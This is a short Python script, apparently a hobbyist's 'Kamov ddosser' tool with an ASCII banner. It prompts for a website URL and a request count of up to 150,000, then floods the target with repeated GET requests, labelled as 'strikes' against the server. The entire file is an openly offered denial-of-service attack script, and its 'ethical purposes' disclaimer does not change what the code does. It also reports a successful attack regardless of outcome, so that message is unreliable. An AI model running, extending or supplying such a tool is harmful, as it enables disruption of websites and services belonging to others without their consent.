import requests
import time
import os
import pyfiglet

class Color:
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    RED = '\033[91m'
    RESET = '\033[0m'

def set_title(title):
    os.system(f'title {title}' if os.name == 'nt' else f'echo -ne "\033]0;{title}\007"')

def print_banner():
    banner = pyfiglet.figlet_format("                                     K a m o v")
    print(Color.BLUE + banner + Color.RESET)
    print("")
    print("")
    print(f"{"\x1b[38;5;6m"}                ╔═══════════════════════════════╗                     ╔═══════════════════════════════╗")
    print(f"{"\x1b[38;5;6m"}                ║  Kamov ddosser by: atibocs    ║                     ║  It's a simple DDoS tool,     ║")
    print(f"{"\x1b[38;5;6m"}                ║  Version 1.0.0                ║                     ║  without bots.                ║")
    print(f"{"\x1b[38;5;6m"}                ║  Discord: AtibocsGaming       ║                     ║         ! Attention !         ║")
    print(f"{"\x1b[38;5;6m"}                ║  Programming language: Python ║                     ║    Please only use this tool  ║")
    print(f"{"\x1b[38;5;6m"}                ║                               ║                     ║    for ethical purposes!      ║")
    print(f"{"\x1b[38;5;6m"}                ║                               ║                     ║                               ║")
    print(f"{"\x1b[38;5;6m"}                ║                               ║                     ║                               ║")
    print(f"{"\x1b[38;5;6m"}                ╚═══════════════════════════════╝                     ╚═══════════════════════════════╝")
    print("")
    print("")

def send_requests(url, num_requests):
    for i in range(num_requests):
        try:
            response = requests.get(url, timeout=5)
            print(f"{Color.RED} Attacking server... Status code: {response.status_code}{Color.RESET}")
        except requests.exceptions.RequestException as e:
            print(f"{Color.RED}Error!")
        time.sleep(0.1)
        
    print(f"{Color.GREEN}Succesful attack!{Color.RESET}")

def print_message(message):
    print(Color.YELLOW + message + Color.RESET)

def main():
    set_title("Kamov")
    print_banner()

    while True:
        url = input(Color.BLUE + "Website URL: " + Color.RESET)

        try:
            num_requests = int(input(Color.BLUE + "Strikes: " + Color.RESET))
            if not (1 <= num_requests <= 150000):
                print_message("")
                continue
        except ValueError:
            print_message(Color.RED + "Enter a number from 1-150000!")
            continue

        try:
            response = requests.head(url, timeout=5)
            if response.status_code == 200:
                send_requests(url, num_requests)
            else:
                print_message(Color.RED + "Invalid URL!")
        except requests.exceptions.RequestException as e:
            print_message(Color.RED + "Invalid URL!")

        retry = input(Color.YELLOW + "Want more? [N]/[Y] ").strip().upper()
        if retry != 'Y':
            break

if __name__ == "__main__":
    main()